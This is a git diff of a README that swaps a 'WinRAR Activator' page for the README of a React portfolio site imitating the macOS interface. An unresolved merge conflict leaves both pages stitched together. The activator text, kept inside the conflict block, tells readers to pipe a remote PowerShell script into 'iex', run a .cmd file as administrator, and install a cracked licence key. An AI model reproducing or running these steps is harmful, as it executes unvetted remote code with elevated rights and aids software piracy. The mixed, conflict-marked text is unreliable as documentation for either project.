@@ -1,49 +1,67 @@
-#   ABC WinRAR Activator
+# playground-macos
+
+My portfolio website simulating macOS's GUI: https://portfolio.zxh.me
+
+Powered by [React](https://reactjs.org/) + [Zustand](https://zustand-demo.pmnd.rs/) + [UnoCSS](https://uno.antfu.me/) + [TypeScript](https://www.typescriptlang.org/) + [Vite](https://vitejs.dev/).
+
+![light mode](./public/screenshots/light.png)
+![dark mode](./public/screenshots/dark.png)
 
 
+&nbsp;
 
-<br>
+## Usage
 
-##   How to use it?
+Clone the repo and install dependencies:
 
-###   A. PowerShell (Windows 10/11)
+```bash
+pnpm install
+```
 
----
+Start dev server (with hot reloading):
 
-Open PowerShell or Terminal.
+```bash
+pnpm dev
+```
 
-Copy-Paste The Code Below, Paste In PowerShell or Terminal And Press Enter:
+Build for production with minification to the `dist` folder:
 
+<<<<<<< HEAD
     irm https://abccompanypoharka.github.io/ABC-WRA/ABCWRA.ps1 | iex
+=======
+```bash
+pnpm build
+```
+>>>>>>> 6a5f3f5324b9f8318e501b9d81dc15cc3bd3ced7
 
-That's It Enjoy !!!
 
-<br>
+&nbsp;
 
-###   B. CMD As Admin (Windows 7/8/8.1)
+## Changelog
 
----
+- **Update 2023.06.26**: Improve [FaceTime](https://support.apple.com/en-us/HT208176).
 
-Download The File With ".cmd" Extension From This Repo.
+- **Update 2023.06.25**: Add [Typora](https://typora.io/), built on top of [Milkdown](https://milkdown.dev/).
 
-Right-Click On The File And Select "Run as Administrator".
+- **Update 2021.12.05**: Simulated the device's actual battery state using [Battery API](https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API), displaying 100% charge on [unsupported browsers](https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API#browser_compatibility).
 
-The Activation Will Begin And Automatically Complete.
+- **Update 2021.12.05**: Refactored for cleaner code by utilizing functional components and hooks. Refer to [this branch](https://github.com/Renovamen/playground-macos/tree/class-component) for the previous version implemented with class components.
 
-That's It Enjoy !!!
 
-<br>
+&nbsp;
 
-###  C. Manual Activation (Windows 7/8/8.1)
+## Credits
 
----
+- macOS
+  - [Monterey](https://www.apple.com/macos/monterey/)
+  - [Catalina](https://www.apple.com/bw/macos/catalina/)
+- [macOS Icon Gallery](https://www.macosicongallery.com/)
+- [sindresorhus/file-icon-cli](https://github.com/sindresorhus/file-icon-cli)
+- [vivek9patel.github.io](https://github.com/vivek9patel/vivek9patel.github.io)
 
-Download The "rarreg.key" File From This Repo.
 
-`Copy` or `Cut` The File And `Paste` It In The Installation Folder Of WinRAR  (e.g., C:\Program Files\WinRAR\).
+&nbsp;
 
-Close Any Open WinRAR Processes And Start It Again.
+## License
 
-That's It Enjoy !!!
-
-<br>
+[MIT](MIT)
